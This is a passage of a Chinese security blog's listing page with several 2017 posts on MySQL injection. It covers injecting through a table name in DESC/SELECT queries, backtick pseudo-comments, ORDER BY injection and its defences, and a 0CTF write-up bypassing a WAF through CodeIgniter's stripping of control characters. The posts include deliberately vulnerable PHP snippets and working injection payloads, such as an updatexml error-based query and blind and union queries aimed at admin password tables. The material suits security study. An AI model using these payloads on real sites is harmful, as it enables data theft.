echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
echo mysql_error();</code></pre>
<p>这种想了很久, 我感觉是无解, 如果有大佬能搞定的话, 求学习。</p>
<h3 id="0x03-表名不完全可控且DESC和SELECT的表名都不含有identifier-quote"><a href="#0x03-表名不完全可控且DESC和SELECT的表名都不含有identifier-quote" class="headerlink" title="0x03 表名不完全可控且DESC和SELECT的表名都不含有identifier quote"></a>0x03 表名不完全可控且DESC和SELECT的表名都不含有identifier quote</h3><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
mysql_query(&quot;use b2cshop&quot;);
$table = $_GET[&#39;table&#39;];
mysql_query(&quot;desc shop_&#123;$table&#125;&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
$sql = &quot;select * from shop_&#123;$table&#125; where 1=1&quot;;
echo $sql;
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
echo mysql_error();</code></pre>
<p>自我感觉,依旧无解。</p>
<h4 id="0x04-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#0x04-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="0x04 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>0x04 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h4><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
mysql_query(&quot;use b2cshop&quot;);
$table = $_GET[&#39;table&#39;];
mysql_query(&quot;desc `shop_&#123;$table&#125;`&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
$sql = &quot;select * from shop_&#123;$table&#125; where 1=1&quot;;
echo $sql;
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
echo mysql_error();</code></pre>
<p>可解,<br><img src="http://onw16foqc.bkt.clouddn.com/14923490866702.jpg"></p>
<p>shop_users 后面的两个``,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,</p>
<pre><code>desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</code></pre>
<p>看一下DESC的Syntax   </p>
<pre><code>DESC tbl_name [col_name | wild]</code></pre>
<p>可以看到表名后面可以接col_name 或者 wild<br>为什么表名后面接了where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)# 却没有报unknown column,<br>感觉是因为这个应该是按照wild来执行的,</p>
<blockquote>
<p>wild, if given, is a pattern string. It can contain the SQL % and _ wildcard characters.</p>
</blockquote>
<p>所以不会报unknown column。</p>
<h4 id="0x05-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#0x05-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="0x05 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>0x05 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h4><p>跟上面一个利用差不多,稍微改一下。</p>
<pre><code>    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
    mysql_query(&quot;use b2cshop&quot;);
    $table = $_GET[&#39;table&#39;];
    mysql_query(&quot;desc shop_&#123;$table&#125;&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
    $sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
    echo $sql;
    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
    var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
    echo mysql_error();</code></pre>
<p><img src="http://onw16foqc.bkt.clouddn.com/14923497093942.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/04/11/为什么-backtick-能做注释符/"><span>为什么`(backtick)能做&amp;quot;注释符&amp;quot;</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/04/11/为什么-backtick-能做注释符/" rel="bookmark">
        <time class="entry-date published" datetime="2017-04-11T07:43:37.000Z">
          2017-04-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <pre><code>文章用markdown写的,用`的时候老是成了代码块,找了会资料都没转义掉,以下用backtick代替`。</code></pre>
<p>很久以前的一个Paper,介绍了mysql下的注释符,里面包含了两种不常见的&quot;注释符&quot;。<br><img src="http://onw16foqc.bkt.clouddn.com/14918862570531.jpg"></p>
<p>今天有小伙伴刚好来问了一下我, 为啥backtick做注释符时,并不是通用的, 也就是有时候并不能注释掉,不能像#这种注释符通用。<br>(其实paper里的NOTE已经基本解答了这个问题,不过NOTE写的是只能用在别名处)</p>
<blockquote>
<p>Note:</p>
</blockquote>
<p>The backtick can only be used to end a query when used as an alias.</p>
<p>他给我的语句类似于</p>
<pre><code>select * from qs_members where username = &#39;x&#39; and password = &#39;x&#39;;

然后他盲注,插入payload
1&#39; and if(substr((select password from qs_admin limit 1),1,1)=&#39;a&#39;,sleep(1),1)` 语句就成了

select * from qs_members where username=&#39;1&#39;and if(substr((select password from qs_admin limit 1),1,1)=&#39;a&#39;,sleep(1),1)` and password=&#39;admin&#39;;</code></pre>
<p>然后这时候语句就开始报错了, 但是如果把backtick换成#,语句就能正常执行, 说明这个时候backtick没有了注释效果。</p>
<p>首先来看一下mysql手册的comment Syntax</p>
<blockquote>
<p>From a # character to the end of the line.</p>
</blockquote>
<p>From a –  sequence to the end of the line. In MySQL, the –  (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on). This syntax differs slightly from standard SQL comment syntax, as discussed in Section 1.8.2.4, “&apos;–&apos; as the Start of a Comment”.</p>
<blockquote>
<p>From a /* sequence to the following */ sequence, as in the C programming language. This syntax enables a comment to extend over multiple lines because the beginning and closing sequences need not be on the same line.</p>
</blockquote>
<p>官方所介绍的注释只有前三种, backtick并不是一个真正的注释符, 而是一个identifier quote。</p>
<blockquote>
<p>Backticks for enclosing identifiers such as table and column names,<br>Backticks are generally used to indicate an identifier and as well be safe from accidentally using the Reserved Keywords.</p>
</blockquote>
<p>一般用来引住表名,列名,别名。</p>
<p>那为什么backtick 能当作&quot;注释符&quot;呢,<br>其实这是因为, 在mysql query 执行sql的时候, 不知道啥原因(翻了会google也没找到具体的解,感觉还是最后的时候mysql给它给闭合了?) backtick在不闭合的情况下, 也能够正常执行。<br><img src="http://onw16foqc.bkt.clouddn.com/14918948815701.jpg"></p>
<p>别名、表名、列名在backtick的引用下,可以写任意字符。<br>所以</p>
<pre><code>select username from qs_members where username = &#39;&#39; and password = &#39;&#39;;
我们在username处插入yu&#39; union select 1 from qs_admin `
语句就成了
select username from qs_members where username = &#39;yu&#39; union select 1 from qs_admin `&#39; and password = &#39;&#39;</code></pre>
<p>给起别名的时候,as是可以省略的,<br>所以后面的&apos; and password = &apos;&apos; 这些字符都成了qs_admin表的别名,<br>也就相当于成了一个&quot;注释符&quot;,让后面的内容不再有以前的效果。</p>
<p>那为什么有时候backtick 又不能当做注释符呢?<br>select * from qs_members where username=&apos;1&apos; and if(substr((select password from qs_admin limit 1),1,1)=&apos;a&apos;,sleep(1),1)` and password=&apos;admin&apos;;<br>像上面我小伙伴失败的那个语句, 很明显backtick在的这个地方, 是一个不允许起别名的地方,所以语句就报错了。<br>还有一种失败的情况是,</p>
<pre><code>当sql语句为 select * from xxx where `username` = &#39;a&#39; union select 1,2` and `password`=&#39;xxxx&#39;
很多查询会把column用`给引住, 在这种情况下, `也不能当作注释符, 因为我们插的` 和后面一个列的` 所闭合, 导致了没办法当作注释。</code></pre>
<p>所以呢,backtick要起一个注释效果, 是需要在允许写表名、列名、别名的地方。</p>
<p>那么盲注、报错之类不用union的注入, 如何使用backtick 来注释呢。<br>方法很多, 比如可以找一个可以用列名的地方, 例如 order by,having 之类的。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14918960157153.jpg"></p>
<p>盲注的话, 会提示找不到这个column<br><img src="http://onw16foqc.bkt.clouddn.com/14918960579734.jpg"></p>
<p>加个@即可</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14918961357392.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/04/04/为什么感觉在实际的测试中ORDER-BY注入的比例变高了/"><span>为什么感觉在实际的测试中ORDER BY注入的比例变高了</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/04/04/为什么感觉在实际的测试中ORDER-BY注入的比例变高了/" rel="bookmark">
        <time class="entry-date published" datetime="2017-04-04T14:19:34.000Z">
          2017-04-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>之前去阿里先知大会的时候, 在听greg.wu的议题的时候, 听到他提了一下他挖order by注入的比例占所有注入比例的20-30%(如果没记错的话)</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14910097216894.jpg"></p>
<p>自己在各种测试的过程中,发现的order by注入也确实不少, 每次看到order,sort之类的参数都会有点小兴奋。</p>
<p>那为什么在现在sql注入越来越少的情况下,order by注入的比例还不低呢。</p>
<p>我感觉是因为常见的查询,直接自己预编译或者用框架里的一些方法就能防止掉注入。<br>但是order by time这种排序是不能通过直接预编译来搞的,<br>因为如果直接像java里的preparestement来预编译,<br>order by ?, setString(1,”time”);<br>最后的sql语句就变成了order by “time”, 对一个字符串排序是没有效果的,所以一些人就又直接把order拼接之类的导致了注入。<br>而且order by 这种排序在程序中却用得不少, 因为有时候要根据用户的要求来排序, 就像网上商城那种即可以用销量来对商品进行排序,也可以用价格之类的来排序, 这时候就得根据用户传递进来的值来进行相应的排序.</p>
<p>那么一般是如何来防止ORDER BY注入的呢。<br>如果不利用框架来防止的话,我见过比较常用的两种是</p>
<p>1:从数据库中查询出来要排序的表中的所有列, 或者就是指定的几个列名,如果用户传递的sort变量不在允许的范围内的话,再把sort变量重置一下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sort = $_GET[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!in_array($sort,<span class="keyword">array</span>(<span class="string">&#x27;time&#x27;</span>,<span class="string">&#x27;price&#x27;</span>)))&#123;</span><br><span class="line">    $sort = <span class="string">&#x27;time&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2:还见得比较多的一种就是用户直接传的是数字, 不过以下这种写法,千万别忘啦default,没default的话,又注入咯。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sort = $_GET[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span>($sort)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        $sort = <span class="string">&#x27;time&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        $sort = <span class="string">&#x27;price&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        $sort = <span class="string">&#x27;time&#x27;</span>; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<p>至于框架对于order by的防御, 有一些框架有防御, 部分没有。</p>
<p>我见过的两种框架防御order by注入的<br>一种是判断用户传递的是不是实体类的属性(hibernate),<br><img src="http://onw16foqc.bkt.clouddn.com/14910128931270.jpg"> </p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14914643931315.jpg"></p>
<p>如果order的参数不是实体类里的属性就直接报错了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14914644062020.jpg"></p>
<p>还有一种就是 用户传递进去的字符串, 给你强行加上<code>`</code>,再对用户传递进来的字符串清掉<code>` , 或者对`转义</code>。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/web/">web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/03/30/2017-0CTF-simplesqlin/"><span>2017 0CTF simplesqlin</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/03/30/2017-0CTF-simplesqlin/" rel="bookmark">
        <time class="entry-date published" datetime="2017-03-30T15:06:12.000Z">
          2017-03-30
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>没打0ctf, 但是在看大佬们的writeup的时候发现了这道题。</p>
<p><img src="http://onlx7r5q5.bkt.clouddn.com/14907493083536.jpg"></p>
<p>当时就觉得这个绕过莫名其妙, 不知道是怎么写的过滤。<br>看了几个博客, 好像都不太清楚绕过的原理,就这样测了下就绕过去了。</p>
<p><img src="http://onlx7r5q5.bkt.clouddn.com/14907494460078.jpg"></p>
<p>不过,当看到这题的flag之后,就大概知道为什么在payload之间插入%00这种可以绕过了。flag是flag{W4f_bY_paSS_FOR_CI} 也就是waf bypass for ci, 也就是用了ci框架清除一些字符的特性来bypass了waf.</p>
<p>在system/core/Input.php的构造方法中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       省略</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_sanitize_globals(); <span class="comment">//净化全局变量,</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_sanitize_globals</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Is $_GET data allowed? If not we&#x27;ll set the $_GET to an empty array</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_allow_get_array === <span class="literal">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$_GET = <span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (is_array($_GET))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $val)</span><br><span class="line">		&#123;</span><br><span class="line">			$_GET[<span class="keyword">$this</span>-&gt;_clean_input_keys($key)] = <span class="keyword">$this</span>-&gt;_clean_input_data($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_clean_input_data</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		$new_array = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span> (array_keys($str) <span class="keyword">as</span> $key)</span><br><span class="line">		&#123;</span><br><span class="line">			$new_array[<span class="keyword">$this</span>-&gt;_clean_input_keys($key)] = <span class="keyword">$this</span>-&gt;_clean_input_data($str[$key]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $new_array;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We strip slashes if magic quotes is on to keep things consistent</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	   <span class="doctag">NOTE:</span> In PHP 5.4 get_magic_quotes_gpc() will always return 0 and</span></span><br><span class="line"><span class="comment">	         it will probably not exist in future versions at all.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">if</span> ( ! is_php(<span class="string">&#x27;5.4&#x27;</span>) &amp;&amp; get_magic_quotes_gpc())</span><br><span class="line">	&#123;</span><br><span class="line">		$str = stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Clean UTF-8 if supported</span></span><br><span class="line">	<span class="keyword">if</span> (UTF8_ENABLED === <span class="literal">TRUE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$str = <span class="keyword">$this</span>-&gt;uni-&gt;clean_string($str);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove control characters</span></span><br><span class="line">	$str = remove_invisible_characters($str, <span class="literal">FALSE</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看注释就能大概看出来清掉了哪些啦。<br>Clean UTF-8 if supported、Remove control characters</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove_invisible_characters</span>(<span class="params">$str, $url_encoded = <span class="literal">TRUE</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$non_displayables = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// every control character except newline (dec 10),</span></span><br><span class="line">	<span class="comment">// carriage return (dec 13) and horizontal tab (dec 09)</span></span><br><span class="line">	<span class="keyword">if</span> ($url_encoded)</span><br><span class="line">	&#123;</span><br><span class="line">		$non_displayables[] = <span class="string">&#x27;/%0[0-8bcef]/i&#x27;</span>;	<span class="comment">// url encoded 00-08, 11, 12, 14, 15</span></span><br><span class="line">		$non_displayables[] = <span class="string">&#x27;/%1[0-9a-f]/i&#x27;</span>;	<span class="comment">// url encoded 16-31</span></span><br><span class="line">		$non_displayables[] = <span class="string">&#x27;/%7f/i&#x27;</span>;	<span class="comment">// url encoded 127</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$non_displayables[] = <span class="string">&#x27;/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S&#x27;</span>;	<span class="comment">// 00-08, 11, 12, 14-31, 127</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		$str = preg_replace($non_displayables, <span class="string">&#x27;&#x27;</span>, $str, <span class="number">-1</span>, $count);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> ($count);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里应该是在清空这些字符之前就检测了字符,<br>所以呢 这里不止%00能绕过, %12, %80-%99之类的不少字符都能绕过。</p>
<p><img src="http://onlx7r5q5.bkt.clouddn.com/3.png"></p>
<p>后面一开始也在想, 这题都没用ci框架那种常见的url route, 也没看到啥明显的特征提示是ci框架,大家怎么能想到是利用ci框架的这个特性来绕过呢,不过后面发现在404页面中使用的是熟悉的ci框架的404页面, 那么也就很简单了。<br><img src="http://onlx7r5q5.bkt.clouddn.com/4.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  <a href="/page/3/" class="pagination-prev">Prev</a>
  
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2024 雨了个雨
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>